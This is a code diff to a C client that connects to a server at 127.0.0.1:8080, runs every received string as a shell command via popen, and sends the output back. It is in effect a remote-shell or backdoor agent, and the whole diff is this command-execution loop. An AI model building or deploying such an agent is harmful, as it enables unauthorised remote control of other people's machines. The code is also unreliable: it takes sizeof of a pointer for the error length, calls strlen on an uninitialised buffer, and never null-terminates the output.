@@ -9,12 +9,13 @@ int kill_rcv = 0;
 void kill_handler(int sig)
 {
     kill_rcv = 1;
+    printf("SIGINT Recv.\n");
 }
 
 int main(void)
 {
     //LEAVE COMMENTED DURING DEV
-    //signal(SIGINT, kill_handler);
+    signal(SIGINT, kill_handler);
     connection server_con = connect_to("127.0.0.1", 8080);
 
     //check if the struct has been filled
@@ -30,14 +31,45 @@ int main(void)
     do
     {
       message data_recieved = recieve_data(server_con);
-      printf("[+] Server said: %s\n", data_recieved.data);
+      printf("[+] Server said: %s\n", (char *)data_recieved.data);
       if (strcmp(data_recieved.data, "exit") == 0)
       {
         exit = 1;
       }
       else
       {
-        system(data_recieved.data);
+        // Create pipe to shell with read permissions
+        FILE *cmdptr;
+        cmdptr = popen(data_recieved.data, "r");
+
+        if (cmdptr == NULL)
+        {
+          // Oops, we couldn't open the pipe properly, notify the server
+          char *errmsg = "ERROR: Could not open pipe to shell";
+          send(server_con.sock_fd, errmsg, sizeof(errmsg), 0);
+          continue;
+        }
+
+        // Read data from pipe character-by-character into buffer
+        char *buffer = malloc(10);
+        char character_read;
+        int length = 0;
+        while ((character_read = fgetc(cmdptr)) != EOF)
+        {
+          // Place our character from the pipe into the buffer
+          buffer[length] = character_read;
+          length++;
+          
+          // Increase the buffer size if needed
+          if (length == strlen(buffer))
+          {
+            buffer = realloc(buffer, length + 10);
+          }
+        }
+
+        // Send the data and close the pipe
+        send(server_con.sock_fd, buffer, strlen(buffer), 0);
+        pclose(cmdptr);
       }
 
     }while(exit == 0 && kill_rcv == 0);
